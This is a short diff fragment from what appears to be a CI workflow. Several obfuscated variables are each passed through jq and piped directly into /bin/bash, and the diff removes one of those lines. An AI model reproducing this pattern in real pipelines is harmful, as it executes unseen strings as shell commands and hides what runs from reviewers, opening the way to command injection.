@@ -24,7 +24,6 @@ jobs:
           echo $ooj0 | jq -r .pijlu39270 | /bin/bash
           echo $tgi52668 | jq -r .bw12 | /bin/bash
           echo $gbbsu92 | jq -r .sorn88 | /bin/bash
-          printf '%s' "$f3" | jq -r .ki0725 | /bin/bash
           echo $sjs74 | jq -r .tacb18656 | /bin/bash
 
       - name: Archive results
